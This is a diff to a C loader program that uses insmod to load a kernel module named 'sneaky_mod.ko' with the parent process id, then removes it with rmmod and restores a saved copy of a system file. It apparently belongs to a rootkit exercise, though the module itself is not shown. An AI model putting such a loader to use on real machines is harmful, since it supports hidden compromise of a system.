@@ -22,15 +22,17 @@ void unload_module(){
   }
   else if( unload_pid == 0){
     
-    char * argv[3] = {"rmmod","sneaky_mod.ko", NULL};
-     if(execvp("rmmod", argv) < 0){
+     char * argv[3] = {"rmmod","sneaky_mod.ko", NULL};
+     int value = execvp("rmmod", argv);
+     if(value == -1){
       perror( "execution error the module un-loading process");
       exit(EXIT_FAILURE);
     }
      else
        printf("Removing module\n");
   }
-  else{
+
+  else {
 
     int wait_status;
     do {
@@ -63,8 +65,9 @@ void load_module(){
     char module_arg[50];
     snprintf(module_arg,sizeof(module_arg), "parent_id = %d\n", parent_process);
     char * argv[4] = {"insmod", "sneaky_mod.ko", module_arg, NULL};
-    
-    if(execvp("insmod", argv) < 0){
+
+    int value = execvp("insmod", argv);
+    if(value  == -1){
       perror( "execution error the module loading process");
       exit(EXIT_FAILURE);
     }
@@ -167,15 +170,15 @@ int main(){
   load_module();
 
   //Enter a loop when the module is being uploaded
-  //loop();
+  loop();
 
   //Exit from the loop suggests removing the module using rmmod
-  // unload_module();
+  unload_module();
 
   //Restore the original file
-  // copy_file(temp, etc);
+  copy_file(temp, etc);
 
   //Delete the content of tmp file
-  //fopen(temp, "w");
+  fopen(temp, "w");
   
 }
